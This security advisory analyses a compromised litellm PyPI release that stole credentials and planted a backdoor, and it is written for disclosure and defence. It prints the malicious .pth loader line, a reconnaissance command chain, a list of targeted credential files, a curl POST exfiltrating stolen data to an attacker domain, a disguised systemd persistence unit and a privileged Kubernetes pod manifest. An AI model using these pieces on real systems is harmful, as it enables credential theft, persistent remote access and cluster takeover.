# litellm — Credential Stealer Hidden in PyPI Wheel

**Date:** March 24, 2026
**Ecosystem:** PyPI
**Severity:** Critical
**Type:** Malicious package / Infostealer / Persistent C2 backdoor / Kubernetes lateral movement
**Sources:**
- [StepSecurity — litellm: Credential Stealer Hidden in PyPI Wheel](https://www.stepsecurity.io/blog/litellm-credential-stealer-hidden-in-pypi-wheel)

---

## Summary

On March 24, 2026, a critical supply chain compromise was identified across two litellm releases on PyPI (`1.82.7` and `1.82.8`), disclosed via GitHub Issue [BerriAI/litellm#24512](https://github.com/BerriAI/litellm/issues/24512). LiteLLM is a widely-used Python library providing a unified API interface across 100+ LLM providers (OpenAI, Anthropic, Bedrock, Vertex AI, etc.) — making it a high-value target embedded in AI application stacks, CI/CD pipelines, and production inference services.

StepSecurity performed independent static analysis on both versions, fully decoding the payloads. The attack is a three-stage operation: a mass credential harvester targeting every cloud provider, SSH key, Kubernetes secret, and crypto wallet reachable on the victim system; AES-256/RSA-4096 encrypted exfiltration to `models.litellm.cloud` (a brand-impersonating attacker domain); and a persistent C2 backdoor that polls `checkmarx.zone/raw` for arbitrary second-stage binaries. The two versions carry byte-for-byte identical payloads with the same embedded RSA public key and same exfiltration endpoint — differing only in injection technique — indicating a publishing credential or CI/CD pipeline compromise spanning at least two releases.

The GitHub issue was quickly flooded with 196+ generic bot spam comments ("Thanks, that helped!", "Worked like a charm") — the same noise-suppression tactic observed in the Trivy second compromise — to obscure severity and create a false impression that users had found workarounds. The use of `checkmarx.zone` as the C2 domain links this attack to the same infrastructure used in the Checkmarx KICS GitHub Action compromise (also March 23–24, 2026), pointing to the TeamPCP threat actor.

---

## Compromised Artifacts

| Artifact | Malicious Version(s) | Injection Method |
|----------|----------------------|-----------------|
| `litellm` (PyPI) | `1.82.8` | Malicious `litellm_init.pth` (34,628 bytes) — executes on every Python startup |
| `litellm` (PyPI) | `1.82.7` | Base64 payload embedded in `litellm/proxy/proxy_server.py` — executes on proxy import |

---

## How It Worked

### Entry Point 1: `litellm==1.82.8` — Malicious `.pth` File

The attack exploits a legitimate Python feature: any `.pth` file placed in a `site-packages/` directory is processed by Python's `site` module on every interpreter startup. Lines beginning with `import` are executed directly — before any application code, with no user interaction. The malicious file `litellm_init.pth` (34,628 bytes) was listed in the package's own `RECORD` file with a valid SHA-256 hash:

```
litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628
```

Its single-line content spawns a detached subprocess to avoid blocking the Python session:

```python
import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('aW1wb3J0IHN1YnByb2Nlc3MK...'))"])
```

This is stealthy because `.pth` execution is a Python interpreter feature — not a `setup.py` hook or postinstall script — so many security scanners and package auditing tools do not flag it. The 34 KB payload is stored as a single opaque base64 blob.

### Entry Point 2: `litellm==1.82.7` — Payload in `proxy_server.py`

Version `1.82.7` embeds the identical credential-stealing payload as a base64 blob directly inside `litellm/proxy/proxy_server.py` at the module's top-level import block:

```python
import subprocess, base64, sys, tempfile, os
b64_payload = "aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRlbXBmaWxl..."
```

This fires when the litellm proxy is imported or started (`litellm --server`), rather than on every Python startup. The RSA public key and exfiltration endpoint are byte-for-byte identical to `1.82.8`, confirming both releases originated from the same attacker.

---

### Stage 1: Mass Credential Harvester

After two base64 decode steps, the first-stage payload is a pure-Python background process that silently collects credentials and exfiltrates them.

**System Reconnaissance** (printed to temp file):
```bash
hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null; printenv
```

**Credential Targets:**

| Category | Targets |
|----------|---------|
| SSH | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa`, `authorized_keys`, `known_hosts`, `config`; `/etc/ssh/ssh_host_*_key` |
| Git | `~/.git-credentials`, `~/.gitconfig` |
| AWS | `~/.aws/credentials`, `~/.aws/config`; EC2 IMDS token + IAM role; live AWS Sig V4 calls to Secrets Manager + SSM Parameter Store (reads all stored secret values) |
| Kubernetes | `~/.kube/config`, `/etc/kubernetes/admin.conf`, `/var/run/secrets/kubernetes.io/serviceaccount/token`; live API calls to enumerate secrets in all namespaces |
| GCP | `~/.config/gcloud/application_default_credentials.json`, `$GOOGLE_APPLICATION_CREDENTIALS` |
| Azure | `~/.azure/` (full recursive walk) |
| Docker | `~/.docker/config.json`, `/kaniko/.docker/config.json`, `/root/.docker/config.json` |
| Env Files | `.env`, `.env.local`, `.env.production`, `/etc/environment`; recursive walk depth 6 across `/home`, `/opt`, `/app`, `/data`, `/var/www` |
| Tokens | `~/.npmrc`, `~/.vault-token`, `~/.netrc`, `~/.pgpass`, `~/.mongorc.js`, `~/.my.cnf`, `~/.msmtprc` |
| Shell History | `~/.bash_history`, `~/.zsh_history`, `~/.mysql_history`, `~/.psql_history`, `~/.rediscli_history` |
| TLS/PKI | `/etc/ssl/private/*.key`, Let's Encrypt `.pem` files; recursive walk for `.pem`, `.key`, `.p12`, `.pfx` |
| CI/CD | `terraform.tfvars`, `terraform.tfstate`, `.gitlab-ci.yml`, `.travis.yml`, `Jenkinsfile`, `.drone.yml`, `ansible.cfg` |
| Crypto Wallets | Bitcoin, Litecoin, Dogecoin, Ethereum keystore, Solana keypairs (`validator-keypair.json`, `identity.json`), Cardano `.skey`/`.vkey` |
| System | `/etc/passwd`, `/etc/shadow`, SSH auth logs (`/var/log/auth.log`, `/var/log/secure`) |

AWS credentials are not just read from disk — the harvester implements a full AWS Signature V4 signing loop in pure Python, making live API calls to retrieve all values from AWS Secrets Manager and SSM Parameter Store.

**Encryption and Exfiltration:**

1. Random 32-byte AES session key: `openssl rand -out session.key 32`
2. Encrypt collected data: `openssl enc -aes-256-cbc -in collected -out payload.enc -pass file:session.key -pbkdf2`
3. Wrap session key with attacker's RSA-4096 public key: `openssl pkeyutl -encrypt -pubin -inkey pub.pem -pkeyopt rsa_padding_mode:oaep`
4. Pack as `tpcp.tar.gz` and POST to C2:

```bash
curl -s -X POST "https://models.litellm.cloud/" \
  -H "Content-Type: application/octet-stream" \
  -H "X-Filename: tpcp.tar.gz" \
  --data-binary @tpcp.tar.gz
```

The RSA public key embedded in both versions begins:
```
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+
08qNLwm3kxzFSMj84M16lmIEeQA8u1X8DGK0EmNg7m3J6C3KzFeIzvz0UTgSq6cV
...
```

---

### Stage 2: Persistent C2 Backdoor

Concurrently with credential theft, the payload drops `sysmon.py` to `~/.config/sysmon/sysmon.py` and registers it as a systemd user service:

```ini
[Unit]
Description=System Telemetry Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /home/user/.config/sysmon/sysmon.py
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

No root is required. The service persists across reboots, restarts on failure, and produces no visible output. The implant polls `https://checkmarx.zone/raw` every ~50 minutes, downloads whatever binary URL is served, makes it executable (`chmod 0o755`), and runs it as a detached process — providing a persistent, updatable RCE channel.

---

### Stage 3: Kubernetes Lateral Movement

If a Kubernetes service account token is found, the harvester deploys a privileged pod to every node in the cluster:

```json
{
  "kind": "Pod",
  "metadata": {"name": "node-setup-<node-name>", "namespace": "kube-system"},
  "spec": {
    "nodeName": "<node>",
    "hostPID": true,
    "hostNetwork": true,
    "tolerations": [{"operator": "Exists"}],
    "containers": [{
      "image": "alpine:latest",
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name": "host", "mountPath": "/host"}]
    }],
    "volumes": [{"hostPath": {"path": "/"}}]
  }
}
```

With `tolerations: [{operator: Exists}]`, the pod schedules on every node including those with `NoSchedule` or `NoExecute` taints. Each pod writes `sysmon.py` to `/host/root/.config/sysmon/sysmon.py` on the node, then installs it as a systemd service via `chroot /host systemctl`. This installs the C2 backdoor on the host node OS — a single compromised workload can silently backdoor every bare-metal or VM node in a cluster.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Mar 23, 2026 | `checkmarx.zone` domain also used as C2 in Checkmarx KICS GitHub Action compromise |
| Mar 24, 2026 | `litellm==1.82.7` and `1.82.8` published with malicious payloads to PyPI |
| Mar 24, 2026 | GitHub Issue BerriAI/litellm#24512 filed: "CRITICAL: Malicious litellm_init.pth in litellm 1.82.8" |
| Mar 24, 2026 | 196+ spam bot comments flood the GitHub issue within hours of disclosure |
| Mar 24, 2026 | StepSecurity publishes full analysis with decoded payload details |

---

## IOCs

| Type | Indicator |
|------|-----------|
| Exfiltration domain | `models.litellm.cloud` |
| C2 polling endpoint | `https://checkmarx.zone/raw` |
| Malicious file | `litellm_init.pth` (SHA256: `ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg`, 34628 bytes) |
| Exfil archive filename | `tpcp.tar.gz` |
| Persistence path | `~/.config/sysmon/sysmon.py` |
| Systemd service | `~/.config/systemd/user/sysmon.service` ("System Telemetry Service") |
| K8s pod name pattern | `node-setup-<node-name>` in `kube-system` namespace |
| RSA key prefix | `MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT...` |

---

## Detection

```bash
# Check for the malicious .pth file (confirms compromised package was installed)
find /usr/lib/python3 ~/.local/lib /opt -name "litellm_init.pth" 2>/dev/null

# Check for persistence backdoor
ls ~/.config/sysmon/sysmon.py
ls ~/.config/systemd/user/sysmon.service
systemctl --user status sysmon.service

# Check for Kubernetes lateral movement pods
kubectl get pods -n kube-system | grep node-setup

# Check all K8s nodes for host backdoor
for node in $(kubectl get nodes -o name); do
  echo "=== $node ===";
  kubectl debug node/${node#node/} -it --image=alpine -- ls /host/root/.config/sysmon/ 2>/dev/null
done

# Audit network logs for exfiltration and C2
grep -r "models\.litellm\.cloud\|checkmarx\.zone" /var/log/

# Check for the malicious .pth file hash specifically
find /usr/lib/python3 ~/.local/lib /opt -name "*.pth" -exec sha256sum {} \; 2>/dev/null | grep ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg

# Check installed litellm version
pip show litellm | grep Version

# Check for tpcp.tar.gz exfiltration artifacts
find /tmp -name "tpcp.tar.gz" -o -name "*.enc" -newer /tmp 2>/dev/null
```

---

## Remediation

1. **Immediately uninstall** affected versions: `pip uninstall litellm` (if `1.82.7` or `1.82.8`)
2. **Remove the malicious `.pth` file** if present:
   ```bash
   find /usr/lib/python3 ~/.local/lib /opt -name "litellm_init.pth" -delete
   ```
3. **Stop and remove the persistence backdoor:**
   ```bash
   systemctl --user stop sysmon.service
   systemctl --user disable sysmon.service
   rm ~/.config/systemd/user/sysmon.service
   rm -rf ~/.config/sysmon/
   systemctl --user daemon-reload
   ```
4. **Delete K8s lateral movement pods** (if on Kubernetes):
   ```bash
   kubectl get pods -n kube-system | grep node-setup
   kubectl delete pods -n kube-system -l <matching label>
   # Also check all nodes for host-level backdoor
   ```
5. **Rotate all secrets** accessible on affected systems: AWS access keys + all IAM roles; Kubernetes service account tokens and kubeconfig certs; SSH private keys (and remove pubkeys from `authorized_keys` on remotes); GCP service account keys; Azure credentials; all `.env` values; Docker/container registry tokens; npm, PyPI, and package registry tokens
6. **Rotate AWS Secrets Manager and SSM secrets regardless** — the harvester calls the APIs live and reads values directly, not just from disk
7. **Audit network logs** for connections to `models.litellm.cloud` and `checkmarx.zone`
8. **CI/CD pipelines:** If `litellm 1.82.7` or `1.82.8` was used in any workflow, treat every secret in that environment as compromised — rotate `NPM_TOKEN`, `PYPI_TOKEN`, `AWS_SECRET_ACCESS_KEY`, GitHub PATs, everything
9. **Upgrade** to a confirmed-clean version and verify absence of `litellm_init.pth` before re-installing

---

## Lessons Learned

- The Python `.pth` file mechanism is a largely unmonitored execution vector — it fires before application code and is invisible to most package auditing tools; scanning for malicious `.pth` files should be standard in supply chain security tooling
- Brand-impersonating C2 domains (`models.litellm.cloud`, `checkmarx.zone`) exploit developer trust in familiar tooling names — DNS egress allowlisting in CI/CD and production environments is essential
- The attacker made live API calls to AWS Secrets Manager and SSM Parameter Store using stolen credentials — secrets in managed vaults are not safe if the machine accessing them is compromised
- Two-version campaigns (different injection techniques, same payload) suggest the attacker tested delivery methods and had persistent CI/CD or publishing credential access
- The K8s lateral movement payload means container-level remediation is insufficient — every node that ran an infected workload with a permissive service account must be treated as host-compromised
- Comment spam on disclosure threads (196+ bot comments) is now an established suppression tactic used by TeamPCP to delay organizational response
- The overlap in C2 infrastructure (`checkmarx.zone`) between this attack and the same-day Checkmarx KICS compromise confirms a coordinated, well-resourced threat actor operating across PyPI and GitHub Actions simultaneously

---

## Related Incidents

- [Checkmarx KICS GitHub Action Compromised](./2026-03-checkmarx-kics-action.md) — same `checkmarx.zone` C2 infrastructure, same day
- [Trivy Second Compromise — Malicious v0.69.4 & Actions Re-Poisoning](./2026-03-trivy-second-compromise.md) — same TeamPCP actor, same comment spam tactic
- [Trivy GitHub Actions Tag Compromise](./2026-03-trivy-github-actions.md)
- [bittensor-wallet PyPI Backdoor](./2026-03-bittensor-pypi.md) — PyPI package compromise with similar encryption/exfil pattern
- [hackerbot-claw AI Attack Campaign](./2026-02-hackerbot-claw.md)
